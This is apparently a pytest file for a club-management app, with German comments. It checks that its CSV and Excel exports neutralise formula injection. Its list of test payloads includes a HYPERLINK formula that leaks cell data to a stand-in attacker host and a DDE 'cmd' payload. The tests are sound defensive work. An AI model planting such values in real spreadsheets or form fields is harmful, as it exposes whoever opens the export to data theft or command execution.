"""Tabellenexporte (CSV/Excel) aus dem Document Studio dürfen Zellinhalte nie als Formel
ausgeben: Personennamen, Listeneinträge, Anliegen und Termintitel kommen von Vereinsmitgliedern.
Ein Wert wie ``=HYPERLINK("https://…";"Klick")`` wurde in der Excel-Datei als echte Formel
gespeichert (openpyxl macht aus Strings mit «=» eine Formel) und in der CSV-Datei von Excel/
LibreOffice beim Öffnen ausgewertet (Formel-/CSV-Injection)."""
from __future__ import annotations

import csv
import io

from openpyxl import load_workbook

from app.documents import exports

DANGEROUS = [
    '=HYPERLINK("https://angreifer.example/?d="&B2;"Klick")',
    "+1+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(1+1)",
    "\t=1+1",
    "\r=1+1",
]


def _tables(values: list[str]) -> list[tuple[str, list[list[str]]]]:
    return [("Liste", [["Name", "Wert"], *[[value, "x"] for value in values]])]


def test_xlsx_never_stores_cell_values_as_formulas():
    content = exports.to_xlsx(_tables(DANGEROUS))
    sheet = load_workbook(io.BytesIO(content)).active
    for row_index, value in enumerate(DANGEROUS, start=2):
        cell = sheet.cell(row=row_index, column=1)
        assert cell.data_type == "s", f"{value!r} wurde als Formel gespeichert"
        assert cell.value == value


def test_csv_neutralises_formula_prefixes():
    content = exports.to_csv(_tables(DANGEROUS)).decode("utf-8").lstrip("﻿")
    rows = list(csv.reader(io.StringIO(content), delimiter=";"))
    cells = [row[0] for row in rows[1:]]
    for cell, value in zip(cells, DANGEROUS, strict=True):
        assert cell == "'" + value


def test_data_export_workbook_never_stores_cell_values_as_formulas():
    """Datenauskunft/Mandantenexport (Anliegen, Listen, Personen) nutzt eine eigene Arbeitsmappe."""
    from app.services.data_export import workbook

    content = workbook.build([workbook.Sheet(title="Anliegen", headers=["Titel", "Betrag"],
                                             rows=[[value, 5] for value in DANGEROUS])])
    sheet = load_workbook(io.BytesIO(content)).active
    for row_index, value in enumerate(DANGEROUS, start=2):
        cell = sheet.cell(row=row_index, column=1)
        assert cell.data_type == "s", f"{value!r} wurde als Formel gespeichert"
        assert cell.value == value
        assert sheet.cell(row=row_index, column=2).value == 5


def test_csv_keeps_plain_values_and_numbers_unchanged():
    plain = ["Anna Muster", "-3", "+5", "-1.5", "12,5%", "—", "", "a=b", "E-Mail"]
    content = exports.to_csv(_tables(plain)).decode("utf-8").lstrip("﻿")
    rows = list(csv.reader(io.StringIO(content), delimiter=";"))
    assert [row[0] for row in rows[1:]] == plain
